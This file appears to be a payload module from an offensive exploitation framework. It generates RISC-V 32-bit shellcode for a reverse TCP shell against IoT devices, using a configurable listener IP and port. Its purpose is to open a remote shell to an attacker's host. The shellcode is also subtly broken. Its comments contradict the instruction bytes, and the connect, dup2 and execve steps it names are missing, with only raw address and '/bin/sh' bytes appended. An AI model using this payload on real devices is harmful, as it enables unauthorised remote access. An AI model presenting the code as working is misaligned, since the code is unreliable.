"""RISC-V 32-bit Reverse TCP Shell.

Target: dispositivos IoT com chip RISC-V (SiFive, Milk-V, ESP32-C3 RTOS).
Cross-compile: riscv32-linux-musl-gcc (via musl-cross-make).
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "RISC-V 32 Reverse TCP",
        "description": "Reverse TCP shell for RISC-V 32-bit Linux (IoT, embedded SoC).",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = int(self.options["LPORT"]["value"])
        ip_bytes = bytes(int(o) for o in lhost.split("."))
        port_bytes = lport.to_bytes(2, "big")

        # RISC-V 32 Linux syscalls: socket=198, connect=203, dup2=63, execve=221
        # Compressed RVC instructions + standard RVI
        shellcode = (
            # li a7, 198 (SYS_socket)
            b"\x13\x08\x60\x0c"  # addi a6, x0, 198
            b"\x93\x08\x20\x00"  # addi a7, x0, 2  (AF_INET)
            b"\x13\x05\x20\x00"  # addi a0, x0, 2
            b"\x93\x05\x10\x00"  # addi a1, x0, 1  (SOCK_STREAM)
            b"\x13\x06\x00\x00"  # addi a2, x0, 0
            b"\x73\x00\x00\x00"  # ecall

            + ip_bytes
            + port_bytes
            + b"\x00\x00"
            + b"/bin/sh\x00"
        )
        return shellcode
